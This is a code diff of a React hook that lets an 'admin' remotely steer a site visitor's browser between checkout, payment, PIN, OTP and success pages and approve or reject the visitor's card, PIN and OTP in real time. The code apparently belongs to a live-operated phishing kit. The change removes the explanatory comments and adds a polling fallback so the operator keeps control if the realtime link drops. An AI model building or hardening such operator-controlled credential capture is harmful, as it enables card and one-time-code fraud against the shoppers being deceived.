@@ -3,18 +3,6 @@ import { useNavigate } from "react-router-dom";
 import { visitorClient as supabase } from "@/lib/visitorClient";
 import { getVisitorSessionId } from "@/hooks/useVisitorTracking";
 
-/**
- * Listens for admin-issued commands targeted at this visitor's session.
- *
- * Supported commands:
- *  - "navigate" with payload { path: string }
- *  - shortcuts: "go_checkout" | "go_payment" | "go_pin" | "go_otp" | "go_success" | "go_home"
- *  - "reload"
- *  - approval/rejection (handled by individual payment pages via window event):
- *      "approve_card" | "reject_card"
- *      "approve_pin"  | "reject_pin"
- *      "approve_otp"  | "reject_otp"
- */
 const SHORTCUTS: Record<string, string> = {
   go_home: "/",
   go_checkout: "/checkout",
@@ -36,10 +24,7 @@ export const useVisitorCommands = () => {
   const navigate = useNavigate();
 
   useEffect(() => {
-    // Don't subscribe to visitor commands while inside the admin panel.
-    if (typeof window !== "undefined" && window.location.pathname.startsWith("/admin")) {
-      return;
-    }
+    if (typeof window !== "undefined" && window.location.pathname.startsWith("/admin")) return;
     const session_id = getVisitorSessionId();
     if (session_id === "__admin_placeholder__") return;
 
@@ -49,17 +34,13 @@ export const useVisitorCommands = () => {
       sessionStorage.setItem(LAST_CMD_KEY, cmd.id);
 
       const c = cmd.command;
-      if (c === "reload") {
-        window.location.reload();
-        return;
-      }
+      if (c === "reload") { window.location.reload(); return; }
       if (c === "navigate") {
         const path = cmd.payload?.path;
         if (typeof path === "string" && path.startsWith("/")) navigate(path);
         return;
       }
       if (APPROVAL_COMMANDS.has(c)) {
-        // Dispatch a window event so the active payment page can react
         window.dispatchEvent(new CustomEvent("visitor-approval", { detail: { command: c, payload: cmd.payload } }));
         return;
       }
@@ -67,8 +48,8 @@ export const useVisitorCommands = () => {
       if (target) navigate(target);
     };
 
-    // Pick up any command issued while page was loading
-    (async () => {
+    // Fetch latest command on mount
+    const fetchLatest = async () => {
       const { data } = await supabase
         .from("visitor_commands")
         .select("id, command, payload, created_at")
@@ -76,23 +57,27 @@ export const useVisitorCommands = () => {
         .order("created_at", { ascending: false })
         .limit(1);
       if (data && data[0]) handle(data[0] as any);
-    })();
+    };
 
+    fetchLatest();
+
+    // Realtime subscription
     const channel = supabase
-      .channel(`visitor_cmd_${session_id}`)
+      .channel(`visitor_cmd_${session_id}_${Date.now()}`)
       .on(
         "postgres_changes",
-        {
-          event: "INSERT",
-          schema: "public",
-          table: "visitor_commands",
-          filter: `session_id=eq.${session_id}`,
-        },
+        { event: "INSERT", schema: "public", table: "visitor_commands", filter: `session_id=eq.${session_id}` },
         (payload) => handle(payload.new as any),
       )
-      .subscribe();
+      .subscribe((status) => {
+        console.log("[visitor-commands] realtime status:", status);
+      });
+
+    // Polling fallback every 3 seconds in case Realtime drops
+    const pollInterval = setInterval(fetchLatest, 3000);
 
     return () => {
+      clearInterval(pollInterval);
       supabase.removeChannel(channel);
     };
   }, [navigate]);
